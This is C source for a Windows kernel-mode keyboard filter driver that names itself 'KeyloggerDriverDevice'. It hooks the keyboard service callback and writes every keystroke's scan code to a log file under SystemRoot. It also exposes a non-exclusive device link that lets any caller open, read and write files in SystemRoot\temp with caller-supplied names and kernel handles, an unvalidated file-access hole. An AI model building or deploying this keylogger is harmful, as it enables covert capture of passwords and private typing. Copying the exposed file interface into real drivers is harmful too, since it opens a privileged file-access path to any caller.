#include "Filter.h"



#ifdef ALLOC_PRAGMA
#pragma alloc_text (INIT, DriverEntry)
#pragma alloc_text (PAGE, FilterEvtDeviceAdd)
//#pragma alloc_text( PAGE, FilterEvtDeviceIoInCallerContext)
#pragma alloc_text( PAGE, FilterEvtDeviceFileCreate)
#pragma alloc_text( PAGE, FilterEvtFileClose)
#pragma alloc_text( PAGE, FileEvtIoRead)
#pragma alloc_text( PAGE, FileEvtIoWrite)
#endif


NTSTATUS
DriverEntry(
    IN PDRIVER_OBJECT  DriverObject,
    IN PUNICODE_STRING RegistryPath
)
{
    WDF_DRIVER_CONFIG   config;
    NTSTATUS            status;
    WDFDRIVER           hDriver;

    KdPrint(("Keyboard filter: DriverEntry\n"));

    //
    // Initialize driver config to control the attributes that
    // are global to the driver. Note that framework by default
    // provides a driver unload routine. If you create any resources
    // in the DriverEntry and want to be cleaned in driver unload,
    // you can override that by manually setting the EvtDriverUnload in the
    // config structure. In general xxx_CONFIG_INIT macros are provided to
    // initialize most commonly used members.
    //

    WDF_DRIVER_CONFIG_INIT(
        &config,
        FilterEvtDeviceAdd
    );

    //
    // Create a framework driver object to represent our driver.
    //
    status = WdfDriverCreate(DriverObject,
        RegistryPath,
        WDF_NO_OBJECT_ATTRIBUTES,
        &config,
        &hDriver);
    if (!NT_SUCCESS(status)) {
        KdPrint(("WdfDriverCreate failed with status 0x%x\n", status));
    }

    return status;
}


NTSTATUS
FilterEvtDeviceAdd(
    IN WDFDRIVER        Driver,
    IN PWDFDEVICE_INIT  DeviceInit
)
{
    WDF_OBJECT_ATTRIBUTES   deviceAttributes;
    PFILTER_EXTENSION       filterExt;
    NTSTATUS                status;
    WDFDEVICE               device;
    WDF_IO_QUEUE_CONFIG     ioQueueConfig;
    WDF_FILEOBJECT_CONFIG   fileConfig;

    KdPrint(("Keyboard filter: FilterEvtDeviceAdd\n"));

    PAGED_CODE();

    UNREFERENCED_PARAMETER(Driver);

    //
    // Set exclusive to TRUE so that no more than one app can talk to the
    // control device at any time.
    //
    WdfDeviceInitSetExclusive(DeviceInit, FALSE);

    WdfDeviceInitSetIoType(DeviceInit, WdfDeviceIoBuffered);

    //
    // Initialize WDF_FILEOBJECT_CONFIG_INIT struct to tell the
    // framework whether you are interested in handling Create, Close and
    // Cleanup requests that gets generated when an application or another
    // kernel component opens an handle to the device. If you don't register
    // the framework default behaviour would be to complete these requests
    // with STATUS_SUCCESS. A driver might be interested in registering these
    // events if it wants to do security validation and also wants to maintain
    // per handle (fileobject) context.
    //

    WDF_FILEOBJECT_CONFIG_INIT(
        &fileConfig,
        FilterEvtDeviceFileCreate,
        FilterEvtFileClose,
        WDF_NO_EVENT_CALLBACK // not interested in Cleanup
    );

    WdfDeviceInitSetFileObjectConfig(DeviceInit,
        &fileConfig,
        WDF_NO_OBJECT_ATTRIBUTES);
    //
    // In order to support METHOD_NEITHER Device controls, or
    // NEITHER device I/O type, we need to register for the
    // EvtDeviceIoInProcessContext callback so that we can handle the request
    // in the calling threads context.
    //
    /*WdfDeviceInitSetIoInCallerContextCallback(DeviceInit,
        FilterEvtDeviceIoInCallerContext);*/



    //
    // Tell the framework that you are filter driver. Framework
    // takes care of inherting all the device flags & characterstics
    // from the lower device you are attaching to.
    //
    WdfFdoInitSetFilter(DeviceInit);

    //
    // Specify the size of device extension where we track per device
    // context.
    //

    WDF_OBJECT_ATTRIBUTES_INIT_CONTEXT_TYPE(&deviceAttributes, FILTER_EXTENSION);

    DECLARE_CONST_UNICODE_STRING(MyDeviceName, L"\\Device\\KeyloggerDriverDevice");
    status = WdfDeviceInitAssignName(
        DeviceInit,
        &MyDeviceName
    );
    if (!NT_SUCCESS(status)) {
        KdPrint(("WdfDeviceInitAssignName failed with status code 0x%x\n", status));
        return status;
    }
    //
    // Create a framework device object.This call will inturn create
    // a WDM deviceobject, attach to the lower stack and set the
    // appropriate flags and attributes.
    //
    status = WdfDeviceCreate(&DeviceInit, &deviceAttributes, &device);
    if (!NT_SUCCESS(status)) {
        KdPrint(("WdfDeviceCreate failed with status code 0x%x\n", status));
        return status;
    }

    DECLARE_CONST_UNICODE_STRING(MySymbolicLink, L"\\DosDevices\\KeyloggerDriverDevice");
    status = WdfDeviceCreateSymbolicLink(device, &MySymbolicLink);
    if (!NT_SUCCESS(status)) {
        KdPrint(("WdfDeviceCreateSymbolicLink failed with status code 0x%x\n", status));
        return status;
    }

    filterExt = FilterGetData(device);

    //
    // Configure the default queue to be Parallel. Do not use sequential queue
    // if this driver is going to be filtering PS2 ports because it can lead to
    // deadlock. The PS2 port driver sends a request to the top of the stack when it
    // receives an ioctl request and waits for it to be completed. If you use a
    // a sequential queue, this request will be stuck in the queue because of the 
    // outstanding ioctl request sent earlier to the port driver.
    //
    WDF_IO_QUEUE_CONFIG_INIT_DEFAULT_QUEUE(&ioQueueConfig, WdfIoQueueDispatchParallel);

    //
    // Framework by default creates non-power managed queues for
    // filter drivers.
    //
    ioQueueConfig.EvtIoInternalDeviceControl = FilterEvtIoInternalDeviceControl;
    ioQueueConfig.EvtIoWrite = FileEvtIoWrite;
    ioQueueConfig.EvtIoRead = FileEvtIoRead;

    status = WdfIoQueueCreate(device,
        &ioQueueConfig,
        WDF_NO_OBJECT_ATTRIBUTES,
        WDF_NO_HANDLE // pointer to default queue
    );
    if (!NT_SUCCESS(status)) {
        KdPrint(("WdfIoQueueCreate failed 0x%x\n", status));
        return status;
    }

    ////
    //// Control devices must notify WDF when they are done initializing.   I/O is
    //// rejected until this call is made.
    ////
    //WdfControlFinishInitializing(device);

    return status;
}

VOID
FilterEvtIoInternalDeviceControl(
    IN WDFQUEUE      Queue,
    IN WDFREQUEST    Request,
    IN size_t        OutputBufferLength,
    IN size_t        InputBufferLength,
    IN ULONG         IoControlCode
)
{
    PFILTER_EXTENSION               filterExt;
    NTSTATUS                        status = STATUS_SUCCESS;
    WDFDEVICE                       device;
    PCONNECT_DATA                   connectData = NULL;
    size_t                          length;


    UNREFERENCED_PARAMETER(OutputBufferLength);
    UNREFERENCED_PARAMETER(InputBufferLength);

    PAGED_CODE();

    KdPrint(("Keyboard filter: EvtIoInternalDeviceControl\n"));

    device = WdfIoQueueGetDevice(Queue);

    filterExt = FilterGetData(device);

    switch (IoControlCode) {

        //
        // Connect a keyboard class device driver to the port driver.
        //
        case IOCTL_INTERNAL_KEYBOARD_CONNECT:
            //
            // Only allow one connection.
            //
            if (filterExt->UpperConnectData.ClassService != NULL) {
                status = STATUS_SHARING_VIOLATION;
                break;
            }

            //
            // Get the input buffer from the request
            // (Parameters.DeviceIoControl.Type3InputBuffer).
            //
            status = WdfRequestRetrieveInputBuffer(Request,
                sizeof(CONNECT_DATA),
                &connectData,
                &length);
            if (!NT_SUCCESS(status)) {
                KdPrint(("WdfRequestRetrieveInputBuffer failed %x\n", status));
                break;
            }

            NT_ASSERT(length == InputBufferLength);

            filterExt->UpperConnectData = *connectData;
            
            ExInitializeFastMutex(&filterExt->FastMutex);

            //
            // Hook into the report chain.  Everytime a keyboard packet is reported
            // to the system, KbFilter_ServiceCallback will be called
            //
            connectData->ClassDeviceObject = WdfDeviceWdmGetDeviceObject(device);

    #pragma warning(disable:4152)  //nonstandard extension, function/data pointer conversion

            connectData->ClassService = FilterServiceCallback;

    #pragma warning(default:4152)

            break;
        default:
            break;
    }

    if (!NT_SUCCESS(status)) {
        WdfRequestComplete(Request, status);
        return;
    }

    //
    // Forward the request down. WdfDeviceGetIoTarget returns
    // the default target, which represents the device attached to us below in
    // the stack.
    //
#if FORWARD_REQUEST_WITH_COMPLETION
    //
    // Use this routine to forward a request if you are interested in post
    // processing the IRP.
    //
    FilterForwardRequestWithCompletionRoutine(Request,
        WdfDeviceGetIoTarget(device));
#else   
    FilterForwardRequest(Request, WdfDeviceGetIoTarget(device));
#endif

    return;
}

VOID
FilterServiceCallback(
    IN PDEVICE_OBJECT  DeviceObject,
    IN PKEYBOARD_INPUT_DATA InputDataStart,
    IN PKEYBOARD_INPUT_DATA InputDataEnd,
    IN OUT PULONG InputDataConsumed
)
{
    PFILTER_EXTENSION   filterExt;
    WDFDEVICE           device;

    KdPrint(("Keyboard filter: FilterServiceCallback\n"));
    KdPrint(("MakeCode: 0x%hx\n", InputDataStart->MakeCode));

    device = WdfWdmDeviceGetWdfDeviceHandle(DeviceObject);

    filterExt = FilterGetData(device);

    PWORKER_DATA data = (PWORKER_DATA)ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(WORKER_DATA), 0x64657246);
    if (data) {
        data->Item = IoAllocateWorkItem(DeviceObject);
        USHORT ScanCode = InputDataStart->MakeCode;
        ScanCode &= 0x00FF;
        if (InputDataStart->Flags & KEY_BREAK) {
            ScanCode |= 0x0080;
        }
        if ((InputDataStart->Flags & KEY_E0) != 0) {
            ScanCode |= 0xE000;
        }
        if ((InputDataStart->Flags & KEY_E1) != 0) {
            ScanCode |= 0xE100;
        }

        data->ScanCode = ScanCode;
        data->FastMutex = &filterExt->FastMutex;
        IoQueueWorkItem(data->Item, WriteMakeCodeToFile, NormalWorkQueue, data);
    }
    else {
        KdPrint(("Could not allocate memory with ExAllocatePool2"));
    }


    (*(PSERVICE_CALLBACK_ROUTINE)(ULONG_PTR)filterExt->UpperConnectData.ClassService)(
        filterExt->UpperConnectData.ClassDeviceObject,
        InputDataStart,
        InputDataEnd,
        InputDataConsumed);
}


VOID
FilterForwardRequest(
    IN WDFREQUEST Request,
    IN WDFIOTARGET Target
)
{
    WDF_REQUEST_SEND_OPTIONS options;
    BOOLEAN ret;
    NTSTATUS status;

    //
    // We are not interested in post processing the IRP so 
    // fire and forget.
    //
    WDF_REQUEST_SEND_OPTIONS_INIT(&options, WDF_REQUEST_SEND_OPTION_SEND_AND_FORGET);

    ret = WdfRequestSend(Request, Target, &options);

    if (ret == FALSE) {
        status = WdfRequestGetStatus(Request);
        KdPrint(("WdfRequestSend failed: 0x%x\n", status));
        WdfRequestComplete(Request, status);
    }
    return;
}

VOID WriteMakeCodeToFile(IN PDEVICE_OBJECT DeviceObject, IN PWORKER_DATA Context) {
    PAGED_CODE();

    KdPrint(("IRQLWorker: %hu\n", KeGetCurrentIrql()));
    
    // File handling
    HANDLE fileHandle;
    OBJECT_ATTRIBUTES objAttr;
    IO_STATUS_BLOCK ioStatusBlock;
    NTSTATUS ntstatus = STATUS_SUCCESS;
    UNICODE_STRING uc;
    RtlInitUnicodeString(&uc, L"\\SystemRoot\\LOGGER\\logs");

    USHORT ScanCode = Context->ScanCode;
    UCHAR     buffer[2];
    buffer[0] = (ScanCode & 255);
    KdPrint(("Buffer[0]: 0x%x\n", (int) buffer[0]));
    buffer[1] = (ScanCode >> 8);
    KdPrint(("Buffer[1]: 0x%x\n", (int)buffer[1]));
    size_t  cb = 2;

    ExAcquireFastMutex(Context->FastMutex);
    KdPrint(("AcquiredFastMutex\n"));

    InitializeObjectAttributes(&objAttr, 
        &uc,
        OBJ_KERNEL_HANDLE,
        NULL, 
        NULL);

    ntstatus = ZwCreateFile(&fileHandle,
        FILE_APPEND_DATA,
        &objAttr, &ioStatusBlock,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OPEN_IF,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL, 0);

    if (!NT_SUCCESS(ntstatus)) {
        KdPrint(("ZwCreateFile failed\n"));
        KdPrint(("ReleasingFastMutex\n"));
        ExReleaseFastMutex(Context->FastMutex);
        return;
    }

    KdPrint(("Opened file: %wZ\n", uc));

    #pragma warning(disable:4267)  //size_t to ULONG cast
    ntstatus = ZwWriteFile(fileHandle, NULL, NULL, NULL, &ioStatusBlock,
        buffer, cb, NULL, NULL);
    #pragma warning(default:4267)  
    if (!NT_SUCCESS(ntstatus)) {
        KdPrint(("Couldn't write to file\n"));
    }

    ZwClose(fileHandle);
    KdPrint(("ReleasingFastMutex\n"));
    ExReleaseFastMutex(Context->FastMutex);
    
    UNREFERENCED_PARAMETER(DeviceObject);
    IoFreeWorkItem(Context->Item);
    ExFreePool(Context);
}

VOID
FilterEvtDeviceFileCreate(
    IN WDFDEVICE            Device,
    IN WDFREQUEST Request,
    IN WDFFILEOBJECT        FileObject
) 
{
    PUNICODE_STRING             fileName;
    UNICODE_STRING              absFileName, directory;
    OBJECT_ATTRIBUTES           fileAttributes;
    IO_STATUS_BLOCK             ioStatus;
    PFILTER_EXTENSION           devExt;
    NTSTATUS                    status;
    USHORT                      length = 0;

    UNREFERENCED_PARAMETER(FileObject);

    PAGED_CODE();

    KdPrint(("FilterEvtDeviceFileCreate\n"));

    devExt = FilterGetData(Device);

    //
    // Assume the directory is a temp directory under %windir%
    //
    RtlInitUnicodeString(&directory, L"\\SystemRoot\\temp");

    //
    // Parsed filename has "\" in the begining. The object manager strips
    // of all "\", except one, after the device name.
    //
    fileName = WdfFileObjectGetFileName(FileObject);


    //
    // Find the total length of the directory + filename
    //
    length = directory.Length + fileName->Length;

    absFileName.Buffer = ExAllocatePool2(POOL_FLAG_PAGED, length, 'ELIF');
    if (absFileName.Buffer == NULL) {
        status = STATUS_INSUFFICIENT_RESOURCES;
        goto End;
    }
    absFileName.Length = 0;
    absFileName.MaximumLength = length;

    status = RtlAppendUnicodeStringToString(&absFileName, &directory);
    if (!NT_SUCCESS(status)) {
        
        KdPrint(("RtlAppendUnicodeStringToString failed with status %!STATUS!"));
        goto End;
    }

    status = RtlAppendUnicodeStringToString(&absFileName, fileName);
    if (!NT_SUCCESS(status)) {
        KdPrint(("RtlAppendUnicodeStringToString failed with status %!STATUS!"));
        goto End;
    }

    KdPrint(("Absolute Filename %wZ", &absFileName));

    InitializeObjectAttributes(&fileAttributes,
        &absFileName,
        OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
        NULL, // RootDirectory
        NULL // SecurityDescriptor
    );

    status = ZwCreateFile(
        &devExt->FileHandle,
        SYNCHRONIZE | GENERIC_WRITE | GENERIC_READ,
        &fileAttributes,
        &ioStatus,
        NULL,// alloc size = none
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ,
        FILE_OPEN_IF,
        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
        NULL,// eabuffer
        0// ealength
    );

    if (!NT_SUCCESS(status)) {

        KdPrint(("ZwCreateFile failed with status %!STATUS!"));
        devExt->FileHandle = NULL;
    }

End:
    if (absFileName.Buffer != NULL) {
        ExFreePool(absFileName.Buffer);
    }

    WdfRequestComplete(Request, status);

    return;
}


VOID
FilterEvtFileClose(
    IN WDFFILEOBJECT    FileObject
) 
{
    PFILTER_EXTENSION devExt;

    PAGED_CODE();


    KdPrint(("FilterEvtFileClose\n"));

    devExt = FilterGetData(WdfFileObjectGetDevice(FileObject));

    if (devExt->FileHandle) {
        KdPrint(("Closing File Handle %p", devExt->FileHandle));
        ZwClose(devExt->FileHandle);
    }

    return;
}

//VOID
//FilterEvtDeviceIoInCallerContext(
//    IN WDFDEVICE  Device,
//    IN WDFREQUEST Request
//)
//{
//    NTSTATUS                   status = STATUS_SUCCESS;
//    PREQUEST_CONTEXT            reqContext = NULL;
//    WDF_OBJECT_ATTRIBUTES           attributes;
//    WDF_REQUEST_PARAMETERS  params;
//    size_t              inBufLen, outBufLen;
//    PVOID              inBuf, outBuf;
//
//    PAGED_CODE();
//
//    WDF_REQUEST_PARAMETERS_INIT(&params);
//
//    WdfRequestGetParameters(Request, &params);
//
//    KdPrint(("Entered FilterEvtDeviceIoInCallerContext %p \n", Request));
//
//    UNREFERENCED_PARAMETER(Device);
//    //
//    // Check to see whether we have recevied a METHOD_NEITHER IOCTL. if not
//    // just send the request back to framework because we aren't doing
//    // any pre-processing in the context of the calling thread process.
//    //
//    if (!(params.Type == WdfRequestTypeDeviceControl &&
//        params.Parameters.DeviceIoControl.IoControlCode ==
//        IOCTL_NONPNP_METHOD_NEITHER)) {
//        //
//        // Forward it for processing by the I/O package
//        //
//        status = WdfDeviceEnqueueRequest(Device, Request);
//        if (!NT_SUCCESS(status)) {
//            TraceEvents(TRACE_LEVEL_ERROR, DBG_IOCTL,
//                "Error forwarding Request 0x%x", status);
//            goto End;
//        }
//
//        return;
//    }
//
//    TraceEvents(TRACE_LEVEL_VERBOSE, DBG_IOCTL, "EvtIoPreProcess: received METHOD_NEITHER ioctl \n");
//
//    //
//    // In this type of transfer, the I/O manager assigns the user input
//    // to Type3InputBuffer and the output buffer to UserBuffer of the Irp.
//    // The I/O manager doesn't copy or map the buffers to the kernel
//    // buffers.
//    //
//    status = WdfRequestRetrieveUnsafeUserInputBuffer(Request, 0, &inBuf, &inBufLen);
//    if (!NT_SUCCESS(status)) {
//        TraceEvents(TRACE_LEVEL_ERROR, DBG_IOCTL,
//            "Error WdfRequestRetrieveUnsafeUserInputBuffer failed 0x%x", status);
//        goto End;
//    }
//
//    status = WdfRequestRetrieveUnsafeUserOutputBuffer(Request, 0, &outBuf, &outBufLen);
//    if (!NT_SUCCESS(status)) {
//        TraceEvents(TRACE_LEVEL_ERROR, DBG_IOCTL,
//            "Error WdfRequestRetrieveUnsafeUserOutputBuffer failed 0x%x", status);
//        goto End;
//    }
//
//    //
//    // Allocate a context for this request so that we can store the memory
//    // objects created for input and output buffer.
//    //
//    WDF_OBJECT_ATTRIBUTES_INIT_CONTEXT_TYPE(&attributes, REQUEST_CONTEXT);
//
//    status = WdfObjectAllocateContext(Request, &attributes, &reqContext);
//    if (!NT_SUCCESS(status)) {
//        TraceEvents(TRACE_LEVEL_ERROR, DBG_IOCTL,
//            "Error WdfObjectAllocateContext failed 0x%x", status);
//        goto End;
//    }
//
//    //
//    // WdfRequestProbleAndLockForRead/Write function checks to see
//    // whether the caller in the right thread context, creates an MDL,
//    // probe and locks the pages, and map the MDL to system address
//    // space and finally creates a WDFMEMORY object representing this
//    // system buffer address. This memory object is associated with the
//    // request. So it will be freed when the request is completed. If we
//    // are accessing this memory buffer else where, we should store these
//    // pointers in the request context.
//    //
//
//#pragma prefast(suppress:6387, "If inBuf==NULL at this point, then inBufLen==0")    
//    status = WdfRequestProbeAndLockUserBufferForRead(Request,
//        inBuf,
//        inBufLen,
//        &reqContext->InputMemoryBuffer);
//
//    if (!NT_SUCCESS(status)) {
//        TraceEvents(TRACE_LEVEL_ERROR, DBG_IOCTL,
//            "Error WdfRequestProbeAndLockUserBufferForRead failed 0x%x", status);
//        goto End;
//    }
//
//#pragma prefast(suppress:6387, "If outBuf==NULL at this point, then outBufLen==0") 
//    status = WdfRequestProbeAndLockUserBufferForWrite(Request,
//        outBuf,
//        outBufLen,
//        &reqContext->OutputMemoryBuffer);
//    if (!NT_SUCCESS(status)) {
//        TraceEvents(TRACE_LEVEL_ERROR, DBG_IOCTL,
//            "Error WdfRequestProbeAndLockUserBufferForWrite failed 0x%x", status);
//        goto End;
//    }
//
//    //
//    // Finally forward it for processing by the I/O package
//    //
//    status = WdfDeviceEnqueueRequest(Device, Request);
//    if (!NT_SUCCESS(status)) {
//        TraceEvents(TRACE_LEVEL_ERROR, DBG_IOCTL,
//            "Error WdfDeviceEnqueueRequest failed 0x%x", status);
//        goto End;
//    }
//
//    return;
//
//End:
//
//    TraceEvents(TRACE_LEVEL_VERBOSE, DBG_IOCTL, "EvtIoPreProcess failed %x \n", status);
//    WdfRequestComplete(Request, status);
//    return;
//}

VOID
FileEvtIoRead(
    IN WDFQUEUE         Queue,
    IN WDFREQUEST       Request,
    IN size_t            Length
)
{
    NTSTATUS                   status = STATUS_SUCCESS;
    PVOID                       outBuf;
    IO_STATUS_BLOCK             ioStatus;
    PFILTER_EXTENSION           devExt;
    FILE_POSITION_INFORMATION   position;
    ULONG_PTR                   bytesRead = 0;
    size_t  bufLength;

    KdPrint(("FileEvtIoRead: Request: 0x%p, Queue: 0x%p\n", Request, Queue));

    PAGED_CODE();

    //
    // Get the request buffer. Since the device is set to do buffered
    // I/O, this function will retrieve Irp->AssociatedIrp.SystemBuffer.
    //
    status = WdfRequestRetrieveOutputBuffer(Request, 0, &outBuf, &bufLength);
    if (!NT_SUCCESS(status)) {
        WdfRequestComplete(Request, status);
        return;

    }

    devExt = FilterGetData(WdfIoQueueGetDevice(Queue));

    if (devExt->FileHandle) {

        //
        // Set the file position to the beginning of the file.
        //
        position.CurrentByteOffset.QuadPart = 0;
        status = ZwSetInformationFile(devExt->FileHandle,
            &ioStatus,
            &position,
            sizeof(FILE_POSITION_INFORMATION),
            FilePositionInformation);
        if (NT_SUCCESS(status)) {

            status = ZwReadFile(devExt->FileHandle,
                NULL,//   Event,
                NULL,// PIO_APC_ROUTINE  ApcRoutine
                NULL,// PVOID  ApcContext
                &ioStatus,
                outBuf,
                (ULONG)Length,
                0, // ByteOffset
                NULL // Key
            );

            if (!NT_SUCCESS(status)) {

                KdPrint(("ZwReadFile failed with status 0x%x", status));
            }

            status = ioStatus.Status;
            bytesRead = ioStatus.Information;
        }
    }

    WdfRequestCompleteWithInformation(Request, status, bytesRead);
}

VOID
FileEvtIoWrite(
    IN WDFQUEUE         Queue,
    IN WDFREQUEST       Request,
    IN size_t            Length
)
{
    NTSTATUS                    status = STATUS_SUCCESS;
    PVOID                       inBuf;
    IO_STATUS_BLOCK             ioStatus;
    PFILTER_EXTENSION           devExt;
    FILE_POSITION_INFORMATION   position;
    ULONG_PTR                   bytesWritten = 0;
    size_t      bufLength;


    KdPrint(("FileEvtIoWrite: Request: 0x%p, Queue: 0x%p\n", Request, Queue));
    PAGED_CODE();

    //
    // Get the request buffer. Since the device is set to do buffered
    // I/O, this function will retrieve Irp->AssociatedIrp.SystemBuffer.
    //
    status = WdfRequestRetrieveInputBuffer(Request, 0, &inBuf, &bufLength);
    if (!NT_SUCCESS(status)) {
        WdfRequestComplete(Request, status);
        return;
    }

    devExt = FilterGetData(WdfIoQueueGetDevice(Queue));

    if (devExt->FileHandle) {

        //
        // Set the file position to the beginning of the file.
        //
        position.CurrentByteOffset.QuadPart = 0;

        status = ZwSetInformationFile(devExt->FileHandle,
            &ioStatus,
            &position,
            sizeof(FILE_POSITION_INFORMATION),
            FilePositionInformation);
        if (NT_SUCCESS(status))
        {

            status = ZwWriteFile(devExt->FileHandle,
                NULL,//   Event,
                NULL,// PIO_APC_ROUTINE  ApcRoutine
                NULL,// PVOID  ApcContext
                &ioStatus,
                inBuf,
                (ULONG)Length,
                0, // ByteOffset
                NULL // Key
            );
            if (!NT_SUCCESS(status))
            {
                KdPrint(("ZwWriteFile failed with status 0x%x", status));
            }

            status = ioStatus.Status;
            bytesWritten = ioStatus.Information;
        }
    }

    WdfRequestCompleteWithInformation(Request, status, bytesWritten);
}


#if FORWARD_REQUEST_WITH_COMPLETION

VOID
FilterForwardRequestWithCompletionRoutine(
    IN WDFREQUEST Request,
    IN WDFIOTARGET Target
)
/*++
Routine Description:

    This routine forwards the request to a lower driver with
    a completion so that when the request is completed by the
    lower driver, it can regain control of the request and look
    at the result.

--*/
{
    BOOLEAN ret;
    NTSTATUS status;

    //
    // The following funciton essentially copies the content of
    // current stack location of the underlying IRP to the next one. 
    //
    WdfRequestFormatRequestUsingCurrentType(Request);

    WdfRequestSetCompletionRoutine(Request,
        FilterRequestCompletionRoutine,
        WDF_NO_CONTEXT);

    ret = WdfRequestSend(Request,
        Target,
        WDF_NO_SEND_OPTIONS);

    if (ret == FALSE) {
        status = WdfRequestGetStatus(Request);
        KdPrint(("WdfRequestSend failed: 0x%x\n", status));
        WdfRequestComplete(Request, status);
    }

    return;
}

VOID
FilterRequestCompletionRoutine(
    IN WDFREQUEST                  Request,
    IN WDFIOTARGET                 Target,
    PWDF_REQUEST_COMPLETION_PARAMS CompletionParams,
    IN WDFCONTEXT                  Context
)
/*++

Routine Description:

    Completion Routine

Arguments:

    Target - Target handle
    Request - Request handle
    Params - request completion params
    Context - Driver supplied context


Return Value:

    VOID

--*/
{
    UNREFERENCED_PARAMETER(Target);
    UNREFERENCED_PARAMETER(Context);

    WdfRequestComplete(Request, CompletionParams->IoStatus.Status);

    return;
}

#endif //FORWARD_REQUEST_WITH_COMPLETION